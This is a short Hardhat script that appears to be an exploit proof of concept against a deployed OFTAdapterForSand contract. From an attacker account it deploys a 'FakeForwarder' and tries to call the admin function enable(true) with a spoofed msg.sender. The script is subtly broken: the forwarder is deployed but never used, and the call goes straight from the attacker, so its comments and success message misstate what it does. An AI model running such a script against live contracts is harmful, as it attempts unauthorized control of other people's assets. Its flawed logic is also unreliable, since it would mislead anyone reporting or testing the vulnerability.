
const { ethers } = require("hardhat");

async function main() {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy the fake forwarder
    const FakeForwarder = await ethers.getContractFactory("FakeForwarder", attacker);
    const fakeForwarder = await FakeForwarder.deploy();
    await fakeForwarder.deployed();
    console.log("FakeForwarder deployed at:", fakeForwarder.address);

    // Attach to deployed OFTAdapterForSand contract (example address used, replace if needed)
    const oftAdapterAddress = "0xYourOFTAdapterContractAddress"; // Replace with actual address
    const OFTAdapter = await ethers.getContractFactory("OFTAdapterForSand", attacker);
    const oftAdapter = await OFTAdapter.attach(oftAdapterAddress);

    // Attempt to call enable(true) using spoofed msg.sender via fake forwarder
    try {
        const tx = await oftAdapter.connect(attacker).enable(true);
        await tx.wait();
        console.log("✅ Successfully called enable(true) using spoofed msg.sender.");
    } catch (err) {
        console.error("❌ Failed to call enable(true):", err.message);
    }
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});
